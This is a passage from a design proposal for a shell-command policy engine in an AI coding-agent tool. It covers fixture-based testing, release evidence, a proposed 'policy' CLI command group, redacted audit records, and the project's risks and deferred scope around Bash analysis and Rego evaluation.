Exhaustively cover deny/bypass-sensitive pairs and all authority/replacement
triples; use pairwise coverage for the remaining dimensions and retain
hand-written high-risk scenarios. Record uncovered combinations explicitly.
Minimize and retain any differential counterexample as a regression fixture.

Release evidence must include zero unexplained permissive divergences, a
complete route ledger, reviewed command-model coverage, compatibility import
diagnostics, and measured cold/warm latency and peak memory against the chosen
bounds. If the useful subset cannot meet the bounds, reduce precision or scope
and retain explicit uncertainty; do not hide exhaustion or relax confinement to
meet a performance target.

## 11. Authoring tools and operational behaviour

Propose a `policy` command group under the existing binary, retaining `vtcode`
until the fork rename lands. `policy check` validates a candidate generation;
`policy test` runs input/expected-output fixtures; `policy effective` shows
active, replaced, and rejected units with authority and digests;
`policy explain` evaluates a supplied request/state without execution.
`policy migrate --dry-run` reports legacy conversions, ambiguous approvals, and
intentional behaviour changes before writing anything.

Examples and counterexamples ship with every policy unit. Explanations show
which evidence and rules contributed, which review obligations remain, what was
superseded, and why a required sandbox cannot be satisfied. Reason text is
bounded, escaped, and redacted before reaching terminal output or model
context. Workspace modules return enumerated reason codes rather than freely
echoing sensitive input. Custom trusted messages undergo the same redaction.

Extend `ThreadEvent` with versioned policy-decision/activation information as
needed, and use the existing memory projections. Audit includes request and
generation identifiers, rule/node IDs, uncertainty categories, approval and
reservation references, and actual execution outcome. Default records omit raw
environments, secret values, and command output. An evaluation allow event is
not an execution-success event.

Operationally distinguish invalid policy, exhausted analysis, denied request,
missing approval, and unavailable enforcement. Emit actionable diagnostics
without retrying execution automatically. Observe latency, worker faults,
uncertainty/review rates, reload failures, and compatibility divergences using
bounded labels rather than raw command strings.

Update the development security guide and quick reference on each delivered
slice. Agent-facing policy tools require prompt guidance and utility-tool
schemas. Update affected module guidance only when implementation changes its
responsibilities; this draft does not change runtime APIs.

## 12. Decisions, risks, and deferred scope

The proposal chooses parser-led abstract analysis over execution-with-spawn
suppression, isolated unit evaluation over a shared untrusted Rego namespace,
and explicit replacement over load-order overrides. These choices trade some
performance and implementation effort for auditable authority boundaries.
Benchmark before sharing compiled state or adding analysis precision.

The largest risks are semantic divergence from GNU Bash, incomplete external
command models, unbounded evaluator behaviour, policy-authoring complexity, and
restrictive migration surprises. Bounded uncertainty, worker isolation,
fixture-driven authoring, and explicit migration diffs address these risks;
none establishes complete analysis of arbitrary programs.

Dependency versions, compiler compatibility, licensed components, and the
replaceable-default catalogue require accepted decisions before enabling the
new authority. Remote signed policy distribution, richer executable models,
additional shell dialects, and an optional Brush execution backend are
deferred. Each needs its own evidence and acceptance boundary. No deferred
feature is required to remove the existing competing policy authorities.

## References

[^1]: [Brush extension hooks](https://github.com/reubeno/brush/blob/main/brush-core/src/extensions.rs)
    and [launch request](https://github.com/reubeno/brush/blob/main/brush-core/src/processes.rs),
    researched through Firecrawl on 2026-11-03.
[^2]: [Regorus engine](https://github.com/microsoft/regorus/blob/main/src/engine.rs),
    [feature manifest](https://github.com/microsoft/regorus/blob/main/Cargo.toml),
    and [OPA conformance limits](https://github.com/microsoft/regorus#opa-conformance).
[^3]: [OPA bundles](https://www.openpolicyagent.org/docs/management-bundles)
    and [Rego policy language](https://www.openpolicyagent.org/docs/policy-language).
